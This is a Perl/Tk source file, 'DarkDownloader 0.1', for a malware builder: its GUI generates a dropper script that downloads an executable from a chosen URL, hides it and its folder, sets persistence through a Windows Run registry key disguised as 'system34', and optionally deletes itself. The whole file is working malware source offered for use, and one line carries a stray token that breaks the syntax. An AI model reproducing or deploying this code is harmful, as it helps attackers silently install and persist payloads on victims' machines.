#!usr/bin/perl
#DarkDownloader 0.1
#Coded By Doddy H
#Command : perl2exe -gui gen_download.pl

use Tk;

my $color_fondo = "black";
my $color_texto = "green";

if ( $^O eq 'MSWin32' ) {
    use Win32::Console;
    Win32::Console::Free();
}

my $ven =
  MainWindow->new( -background => $color_fondo, -foreground => $color_texto );
$ven->geometry("340x320+20+20");
$ven->resizable( 0, 0 );
$ven->title("DarkDownloader 0.1");

$ven->Label(
    -text       => "Link : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 20 );
my $link = $ven->Entry(
    -text       => "http://localhost/test.exe",
    -width      => 40,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 60, -y => 25 );

$ven->Label(
    -text       => "-- == Options == --",
    -background => $color_fondo,
    -foreground => $color_texto,
    -font       => "Impact"
)->place( -x => 90, -y => 60 );

$ven->Checkbutton(
    -activebackground => $color_texto,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -text             => "Save File with this name : ",
    -variable         => \$op_save_file_name
)->place( -x => 20, -y => 100 );
my $save_file_with_name = $ven->Entry(
    -width      => 20,
    -text       => "testar.exe",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 170, -y => 100 );

$ven->Checkbutton(
    -activebackground => $color_texto,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -text             => "Save File in this directory : ",
    -variable         => \$op_save_in_dir
)->place( -x => 20, -y => 130 );
my $save_file_in_this_dir = $ven->Entry(
    -background => $color_fondo,
    -foreground => $color_texto,
    -width      => 20,
    -text       => "C:/WINDOWS/sexnow/"
)->place( -x => 170, -y => 130 );

$ven->Checkbutton(
    -activebackground => $color_texto,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -text             => "Hide File",
    -variable         => \$op_hide
)->place( -x => 20, -y => 160 );

$ven->Checkbutton(
    -activebackground => $color_texto,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -text             => "Load each time you start Windows",
    -variable         => \$op_regedit
)->place( -x => 20, -y => 190 );

$ven->Checkbutton(
    -activebackground => $color_texto,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -text             => "AutoDelete",
    -variable         => \$op_chau
)->place( -x => 20, -y => 220 );

$ven->Button(
    -command          => \&genow,
    -activebackground => $color_texto,
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -text             => "Generate !",
    -font             => "Impact",
    -width            => 30
)->place( -x => 40, -y => 260 );

MainLoop;

sub genow {

    my $code_now = q(#!usr/bin/perl
#DarkDownloader 0.1
#Coded By Doddy H

use LWP::UserAgent;
use File::Basename;
use File::Copy qw(move);
use Win32::File;
use Win32::TieRegistry( Delimiter => "/" );
use Cwd;

my $nave = LWP::UserAgent->new;
$nave->agent(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
);
$nave->timeout(5);

# Config

my $link                      = "ACA_VA_TU_LINK";
my $op_bajar_con_este_nombre  = ACA_VA_TU_OP_NOMBRE;
my $op_bajar_con_este_nombrex = "ACA_VA_TU_OP_NOMBREX";
my $op_en_este_dir            = ACA_VA_TU_OP_DIR;
my $op_en_este_dirx           = "ACA_VA_TU_OP_DIRX";
my $op_ocultar_archivos       = ACA_VA_TU_OP_HIDE;
my $op_agregar_al_registro    = ACA_VA_TU_OP_REG;
my $op_chau                   = ACA_VA_TU_CHAU;

#

# Download File

if ( $op_bajar_con_este_nombre eq 1 ) {
    download( $link, $op_bajar_con_este_nombrex );
}
else {
    download( $link, basename($link) );
}

# Change Directory

if ( $op_en_este_dir eq 1 ) {

    unless ( -d $op_en_este_dirx ) {
        mkdir( $op_en_este_dirx, 777 );
    }

    if ( $op_bajar_con_este_nombre eq 1 ) {
        move( $op_bajar_con_este_nombrex,
            $op_en_este_dirx . "/" . $op_bajar_con_este_nombrex );
    }
    else {
        move( basename($link), $op_en_este_dirx );
    }

}

# HIDE FILES

if ( $op_ocultar_archivos eq 1 ) {

    hideit( basename($link),                                     "hide" );
    hideit( $op_en_este_dirx,                                    "hide" );
    hideit( $op_en_este_dirx . "/" . $op_bajar_con_este_nombrex, "hide" );

}

# REG ADD

if ( $op_agregar_al_registro eq 1 ) {

    if ( $op_bajar_con_este_nombre eq 1 ) {

        if ( $op_en_este_dir eq 1 ) {
            $Registry->{
"LMachine/Software/Microsoft/Windows/CurrentVersion/Run//system34"
              } = $op_en_este_dirx
              . "/"
              . $op_bajar_con_este_nombrex;
        }
        else {
            $Registry->{
"LMachine/Software/Microsoft/Windows/CurrentVersion/Run//system34"
              } = getcwd()
              . "/"
              . $op_bajar_con_este_nombrex;
        }

    }
    else {

        if ( $op_en_este_dir eq 1 ) {
            $Registry->{
"LMachine/Software/Microsoft/Windows/CurrentVersion/Run//system34"
              } = $op_en_este_dirx
              . "/"
              . basename($link);
        }
        else {
            $Registry->{
"LMachine/Software/Microsoft/Windows/CurrentVersion/Run//system34"
              } = getcwd()
              . "/"
              . basename($link);
        }
    }

}

## Boom !

if ( $op_chau eq 1 ) {

    unlink($0);

}

##

sub hideit {
    if ( $_[1] eq "show" ) {
        Win32::File::SetAttributes( $_[0], NORMAL );
    }
    elsif ( $_[1] eq "hide" ) {
   winkey     Win32::File::SetAttributes( $_[0], HIDDEN );
    }
}

sub download {
    if ( $nave->mirror( $_[0], $_[1] ) ) {
        if ( -f $_[1] ) {
            return true;
        }
    }
}

# The End ?);

    my $link     = $link->get;
    my $new_file = $save_file_with_name->get;
    my $new_dir  = $save_file_in_this_dir->get;

    $code_now =~ s/ACA_VA_TU_LINK/$link/;

    if ( $op_save_file_name eq 1 ) {
        $code_now =~ s/ACA_VA_TU_OP_NOMBRE/1/;
    }
    else {
        $code_now =~ s/ACA_VA_TU_OP_NOMBRE/0/;
    }

    $code_now =~ s/ACA_VA_TU_OP_NOMBREX/$new_file/;

    if ( $op_save_in_dir eq 1 ) {
        $code_now =~ s/ACA_VA_TU_OP_DIR/1/;
    }
    else {
        $code_now =~ s/ACA_VA_TU_OP_DIR/0/;
    }

    $code_now =~ s/ACA_VA_TU_OP_DIRX/$new_dir/;

    if ( $op_hide eq 1 ) {
        $code_now =~ s/ACA_VA_TU_OP_HIDE/1/;
    }
    else {
        $code_now =~ s/ACA_VA_TU_OP_HIDE/0/;
    }

    if ( $op_regedit eq 1 ) {
        $code_now =~ s/ACA_VA_TU_OP_REG/1/;
    }
    else {
        $code_now =~ s/ACA_VA_TU_OP_REG/0/;
    }

    if ( $op_chau eq 1 ) {
        $code_now =~ s/ACA_VA_TU_CHAU/1/;
    }
    else {
        $code_now =~ s/ACA_VA_TU_CHAU/0/;
    }

    if ( -f gen_download . pl ) {
        unlink("gen_download.pl");
    }

    open( FILE, ">>gen_download.pl" );
    print FILE $code_now;
    close FILE;

    $ven->Dialog(
        -title            => "Oh Yeah",
        -buttons          => ["OK"],
        -text             => "Enjoy this downloader",
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->Show();

}

#The End ?